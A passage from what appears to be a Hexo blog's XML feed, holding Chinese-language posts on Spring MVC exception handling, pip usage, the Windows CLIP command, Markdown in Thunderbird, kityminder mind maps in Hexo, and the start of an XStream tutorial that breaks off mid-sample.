<h4 id="ExceptionHandler的处理"><a href="#ExceptionHandler的处理" class="headerlink" title="@ExceptionHandler的处理"></a>@ExceptionHandler的处理</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implementation of the &#123;<span class="doctag">@link</span> org.springframework.web.portlet.HandlerExceptionResolver&#125; interface that handles</span></span><br><span class="line"><span class="comment"> * exceptions through the &#123;<span class="doctag">@link</span> ExceptionHandler&#125; annotation.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This exception resolver is enabled by default in the &#123;<span class="doctag">@link</span> org.springframework.web.portlet.DispatcherPortlet&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Arjen Poutsma</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Juergen Hoeller</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 3.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnnotationMethodHandlerExceptionResolver</span> <span class="keyword">extends</span> <span class="title">AbstractHandlerExceptionResolver</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">doResolveException</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            PortletRequest request, MimeResponse response, Object handler, Exception ex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (handler != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Method handlerMethod = findBestExceptionHandlerMethod(handler, ex);</span><br><span class="line">            <span class="keyword">if</span> (handlerMethod != <span class="keyword">null</span>) &#123;</span><br><span class="line">                NativeWebRequest webRequest = <span class="keyword">new</span> PortletWebRequest(request, response);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object[] args = resolveHandlerArguments(handlerMethod, handler, webRequest, ex);</span><br><span class="line">                    <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">                        logger.debug(<span class="string">"Invoking request handler method: "</span> + handlerMethod);</span><br><span class="line">                    &#125;</span><br><span class="line">                    Object retVal = doInvokeMethod(handlerMethod, handler, args);</span><br><span class="line">                    <span class="keyword">return</span> getModelAndView(retVal);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception invocationEx) &#123;</span><br><span class="line">                    logger.error(<span class="string">"Invoking request method resulted in exception : "</span> + handlerMethod, invocationEx);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和普通的处理类似，从所有标注了<code>@ExceptionHandler</code>的方法中找到最佳匹配，然后解析参数，调用。</p>
<h2 id="web容器的错误处理"><a href="#web容器的错误处理" class="headerlink" title="web容器的错误处理"></a>web容器的错误处理</h2><p><code>WEB-INF/web.xml</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/Error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exception-type</span>&gt;</span>java.lang.Exception<span class="tag">&lt;/<span class="name">exception-type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/Error.jsp<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>location中的值可以是一个jsp，也可以是一个URL（包括<code>@Controller</code>注解的）</p>
<p>处理error的Controller示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ErrorController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping</span>(path = <span class="string">"/error"</span>, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)</span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">handle</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(<span class="string">"status"</span>, request.getAttribute(<span class="string">"javax.servlet.error.status_code"</span>));</span><br><span class="line">        map.put(<span class="string">"reason"</span>, request.getAttribute(<span class="string">"javax.servlet.error.message"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JSP示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=&quot;application/json&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class="line">&#123;</span><br><span class="line">status:&lt;%=request.getAttribute(&quot;javax.servlet.error.status_code&quot;) %&gt;,</span><br><span class="line">reason:&lt;%=request.getAttribute(&quot;javax.servlet.error.message&quot;) %&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="http://www.cnblogs.com/hupengcool/p/4586910.html" rel="external nofollow noopener noreferrer" target="_blank">SpringMVC 异常处理 - 纵酒挥刀斩人头 - 博客园</a></p>
</li>
<li><p><a href="https://docs.spring.io/spring/docs/current/spring-framework-reference/html/mvc.html#mvc-exceptionhandlers" rel="external nofollow noopener noreferrer" target="_blank">22. Web MVC framework</a></p>
</li>
<li><p><a href="http://howtodoinjava.com/spring/spring-mvc/spring-mvc-simplemappingexceptionresolver-example/" rel="external nofollow noopener noreferrer" target="_blank">Spring MVC Mapping Exceptions to Views Example | Spring MVC SimpleMappingExceptionResolver Example</a></p>
</li>
<li><p><a href="http://stackoverflow.com/questions/15987212/custom-error-page-in-tomcat-7-for-error-code-500" rel="external nofollow noopener noreferrer" target="_blank">java - Custom Error Page in Tomcat 7 for Error Code 500 - Stack Overflow</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> exception </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[pip使用]]></title>
      <url>http://qsli.github.io/2017/01/08/pip/</url>
      <content type="html"><![CDATA[<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载安装文件, <a href="https://bootstrap.pypa.io/get-pip.py" rel="external nofollow noopener noreferrer" target="_blank"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure>
<h3 id="从列表文件安装"><a href="#从列表文件安装" class="headerlink" title="从列表文件安装"></a>从列表文件安装</h3><p>导出文件列表(一般配合virtualenv适应)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ pip freeze                               </span><br><span class="line">backports-abc==0.4                         </span><br><span class="line">backports.shutil-get-terminal-size==1.0.0  </span><br><span class="line">backports.ssl-match-hostname==3.5.0.1      </span><br><span class="line">beautifulsoup4==4.5.1                      </span><br><span class="line">bs4==0.0.1                                 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以重定向到一个文件中，一般叫做requirements.txt</p>
<p>然后安装的时候，可以使用下面的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
<h3 id="安装VCS上的软件"><a href="#安装VCS上的软件" class="headerlink" title="安装VCS上的软件"></a>安装VCS上的软件</h3><blockquote>
<p>pip currently supports cloning over git, git+http, git+https, git+ssh, git+git and git+file:</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[-e] git://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+http://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+https://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+ssh://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+git://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">[-e] git+file://git.myproject.org/MyProject#egg=MyProject</span><br><span class="line">-e git+git@git.myproject.org:MyProject#egg=MyProject</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><p><a href="https://pip.pypa.io/en/stable/reference/pip_install/#vcs-support" rel="external nofollow noopener noreferrer" target="_blank">pip install — pip 9.0.1 documentation</a></p>
</li>
<li><p><a href="https://segmentfault.com/a/1190000003050954" rel="external nofollow noopener noreferrer" target="_blank">Django | requirement.txt 生成 - 黑月亮 - SegmentFault</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pip </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[windows命令操作剪贴板——CLIP]]></title>
      <url>http://qsli.github.io/2017/01/07/CLIP/</url>
      <content type="html"><![CDATA[<h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><blockquote>
<p>CLIP</p>
</blockquote>
<blockquote>
<p>Description:<br>    Redirects output of command line tools to the Windows clipboard.<br>    This text output can then be pasted into other programs.</p>
</blockquote>
<blockquote>
<p>Parameter List:<br>    /?                  Displays this help message.</p>
</blockquote>
<blockquote>
<p>Examples:<br>    DIR | CLIP          Places a copy of the current directory<br>                        listing into the Windows clipboard.</p>
</blockquote>
<blockquote>
<p>   CLIP &lt; README.TXT   Places a copy of the text from readme.txt<br>                        on to the Windows clipboard.</p>
</blockquote>
<h2 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h2><h3 id="将ip地址拷贝到剪贴板"><a href="#将ip地址拷贝到剪贴板" class="headerlink" title="将ip地址拷贝到剪贴板"></a>将ip地址拷贝到剪贴板</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig | find <span class="string">"IPv4"</span> | find /V <span class="string">"自动"</span>  | find /V <span class="string">"Auto"</span> | awk <span class="string">"&#123; print <span class="variable">$(NF)</span>;&#125;"</span> | CLIP</span><br></pre></td></tr></table></figure>
<p>也可以添加一个alias，这样就不用每次敲<code>ipconfig</code>, 然后复制ip了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="http://superuser.com/questions/382265/fastest-method-to-determine-my-pcs-ip-address-windows" rel="external nofollow noopener noreferrer" target="_blank">Fastest method to determine my PC’s IP address (Windows) - Super User</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> shell </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 剪贴板 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ThunderBird使用Markdown写邮件]]></title>
      <url>http://qsli.github.io/2017/01/02/markdown-here/</url>
      <content type="html"><![CDATA[<h1 id="Thunderbird"><a href="#Thunderbird" class="headerlink" title="Thunderbird"></a>Thunderbird</h1><p><img src="https://www.mozilla.org/media/img/thunderbird/landing/wordmark.3b0e03fa56f1.png" alt></p>
<p>是Mozilla基金推出的免费、开源的邮件客户端，它支持linux、mac和windows。</p>
<p>这个客户端看起来和火狐非常像，也支持插件扩展。</p>
<h1 id="markdown-here"><a href="#markdown-here" class="headerlink" title="markdown here"></a>markdown here</h1><p>markdown here便是借助markdown的力量来编写邮件。他在Chrome、Firefox、Safari上都有插件。</p>
<p>Thunderbird中的插件：</p>
<img src="/2017/01/02/markdown-here/additional.jpg" title="插件">
<p>插件安装好之后，在编写gmail等支持富文本编辑器的时候就可以将markdown转换成相应的样式。</p>
<p>markdown here也提供了Thunderbird的插件，在附加组件中安装重启后即可使用markdown来编辑，</p>
<p>编写完成后，点击工具栏的图标即可进行转换。</p>
<img src="/2017/01/02/markdown-here/mail.jpg" title="编写邮件">
<p>转换的样式也可以在设置中自己定义。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>1.<a href="http://www.yangzhiping.com/tech/markdown-tips.html" rel="external nofollow noopener noreferrer" target="_blank">Markdown小技巧集合 - 阳志平的网志</a></p>
<p>2.<a href="http://markdown-here.com/" rel="external nofollow noopener noreferrer" target="_blank">Markdown Here</a></p>
]]></content>
      
        <categories>
            
            <category> markdown </category>
            
        </categories>
        
        
        <tags>
            
            <tag> markdown-here </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Hexo中使用markdown来绘制脑图（mind map）]]></title>
      <url>http://qsli.github.io/2017/01/01/markdown-mindmap/</url>
      <content type="html"><![CDATA[<h1 id="脑图是什么？"><a href="#脑图是什么？" class="headerlink" title="脑图是什么？"></a>脑图是什么？</h1><p>脑图英文叫做<code>mind map</code>, 是一种帮助发散思维的工具。将读过的书、看过的源码等总结成脑图，等下次需要复习的时候</p>
<p>顺着脑图去看，效率非常高。</p>
<img src="/2017/01/01/markdown-mindmap/sample.jpg">
<h2 id="用makrdown来画脑图"><a href="#用makrdown来画脑图" class="headerlink" title="用makrdown来画脑图"></a>用makrdown来画脑图</h2><p><code>markdown</code>是一种非常方便的标记性语言，使用<code>markdown</code>记录可以忽略格式带来的困扰，让我们更加的专注于内容。</p>
<p>脑图的结构也不复杂，就是一级一级的分支。使用markdown完全可以表达出来，关键是怎么渲染出来。</p>
<h2 id="kityminder"><a href="#kityminder" class="headerlink" title="kityminder"></a>kityminder</h2><p>经多番查找，最终锁定了百度前端团队开源的——<code>kityminder</code>, <a href="http://naotu.baidu.com/" rel="external nofollow noopener noreferrer" target="_blank">百度脑图</a>也是使用这个构建的。</p>
<p><code>kityminder</code>分成了两部分，一部分是<a href="https://github.com/fex-team/kityminder-core" rel="external nofollow noopener noreferrer" target="_blank">kityminder-core</a>,一个是<a href="https://github.com/fex-team/kityminder-editor" rel="external nofollow noopener noreferrer" target="_blank">kityminder-editor</a>.</p>
<img src="/2017/01/01/markdown-mindmap/relations.png">
<h3 id="kityminder-core"><a href="#kityminder-core" class="headerlink" title="kityminder-core"></a>kityminder-core</h3><p>kityminder-core是百度脑图最核心部分的实现，主要包括了:</p>
<ul>
<li><p>包括脑图数据的可视化展示（Json 格式）</p>
</li>
<li><p>包括简单的编辑功能（节点创建、编辑、删除）。更加强大编辑功能的 KityMinder 编辑器请移步 kityminder-editor</p>
</li>
<li><p>不包含第三方格式（FreeMind、XMind、MindManager）的支持，可以加载 kityminder-protocol 来扩展第三方格式支持。</p>
</li>
<li><p>不包含文件存储的支持，需要自行实现存储。可参照百度脑图中的开源的 fio + 百度网盘方案进行实现。</p>
</li>
</ul>
<h3 id="kityminder-editor"><a href="#kityminder-editor" class="headerlink" title="kityminder-editor"></a>kityminder-editor</h3><blockquote>
<p>KityMinder Editor 是一款强大、简洁、体验优秀的脑图编辑工具，适合用于编辑树/图/网等结构的数据。</p>
</blockquote>
<blockquote>
<p>编辑器由百度 FEX 基于 kityminder-core 搭建，并且在百度脑图中使用。</p>
</blockquote>
<h2 id="让hexo支持kityminder"><a href="#让hexo支持kityminder" class="headerlink" title="让hexo支持kityminder"></a>让hexo支持kityminder</h2><p>这个主要是客户端渲染的。</p>
<h3 id="引入依赖"><a href="#引入依赖" class="headerlink" title="引入依赖"></a>引入依赖</h3><p>引入<code>kityminder-core</code>的js和css，以及<code>kityminder-core</code>的依赖kity到相应的主题下面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//core压缩后的</span><br><span class="line">kityminder.core.min.js</span><br><span class="line">//kity的cdn地址</span><br><span class="line">https://cdn.rawgit.com/fex-team/kity/dev/dist/kity.min.js</span><br></pre></td></tr></table></figure>
<h3 id="为mind-map找到一个标签"><a href="#为mind-map找到一个标签" class="headerlink" title="为mind map找到一个标签"></a>为<code>mind map</code>找到一个标签</h3><p>渲染需要<em>数据</em>和<em>容器</em>节点。数据的标记应该越简单越好。</p>
<p>查阅hexo的官方文档，发现了几个支持设置class属性的标签，以及raw标签。</p>
<p>先来看看<code>raw</code>标签：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<p><code>raw</code>标签里面是可以写html的，渲染的时候不会加以改变，但是写起了比较麻烦，失去了标记性语言简单的特性。</p>
<p><code>pull quote</code>标签：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote [class] %&#125;</span><br><span class="line">content</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>
<p><code>pull quote</code> 标签支持设置class属性，使用这个标签，然后设置一个我们自己的class，比如<code>mindmap</code></p>
<h3 id="渲染数据"><a href="#渲染数据" class="headerlink" title="渲染数据"></a>渲染数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> minder = <span class="keyword">new</span> kityminder.Minder(&#123;</span><br><span class="line">            renderTo: <span class="string">'.mindmap'</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">var</span> markdownText = $(<span class="string">'.mindmap'</span>).text().trim();</span><br><span class="line">        $(<span class="string">'.mindmap p'</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params">index, element</span>) </span>&#123;</span><br><span class="line">            element.style.display = <span class="string">'none'</span>;</span><br><span class="line">        &#125;);</span><br><span class="line">        minder.importData(<span class="string">'markdown'</span>, markdownText);</span><br><span class="line">        minder.disable();</span><br><span class="line">        minder.execCommand(<span class="string">'hand'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="number">3000</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>使用markdown写mind map示例:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% pullquote mindmap %&#125;</span><br><span class="line">#主题</span><br><span class="line">##一级分支</span><br><span class="line">###二级分支</span><br><span class="line">##一级分支</span><br><span class="line">##一级分支</span><br><span class="line">###二级分支</span><br><span class="line">####三级分支</span><br><span class="line">&#123;% endpullquote %&#125;</span><br></pre></td></tr></table></figure>
<p>渲染的效果</p>
<blockquote class="pullquote mindmap"><p>#主题</p>
<p>##一级分支</p>
<p>###二级分支</p>
<p>##一级分支</p>
<p>##一级分支</p>
<p>###二级分支</p>
<p>####三级分支</p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://hexo.io/zh-cn/docs/tag-plugins.html" rel="external nofollow noopener noreferrer" target="_blank">标签插件（Tag Plugins） | Hexo</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> hexo </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mindmap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[xstream教程]]></title>
      <url>http://qsli.github.io/2016/12/27/xstream/</url>
      <content type="html"><![CDATA[<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><img src="http://x-stream.github.io/logo.gif" alt></p>
<h2 id="pom依赖"><a href="#pom依赖" class="headerlink" title="pom依赖"></a>pom依赖</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.thoughtworks.xstream/xstream --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="输出xml"><a href="#输出xml" class="headerlink" title="输出xml"></a>输出xml</h2><h3 id="手动配置"><a href="#手动配置" class="headerlink" title="手动配置"></a>手动配置</h3><p>Author 类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Author</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Author</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Entry 类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String title, description;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Entry</span><span class="params">(String title, String description)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.title = title;</span><br><span class="line">        <span class="keyword">this</span>.description = description;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Blog 类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Author writer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List entries = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Blog</span><span class="params">(Author writer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.writer = writer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(Entry entry)</span> </span>&#123;</span><br><span class="line">        entries.add(entry);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> entries;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Blog teamBlog = <span class="keyword">new</span> Blog(<span class="keyword">new</span> Author(<span class="string">"qisheng.li"</span>));</span><br><span class="line">        teamBlog.add(<span class="keyword">new</span> Entry(<span class="string">"first"</span>, <span class="string">"first blog entry"</span>));</span><br><span class="line">        teamBlog.add(<span class="keyword">new</span> Entry(<span class="string">"second"</span>, <span class="string">"second blog entry"</span>));</span><br><span class="line"></span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        System.out.println(xStream.toXML(teamBlog));        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出的内容为:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.air.xml.xstream.alias.Blog</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">writer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>qisheng.li<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">writer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entries</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 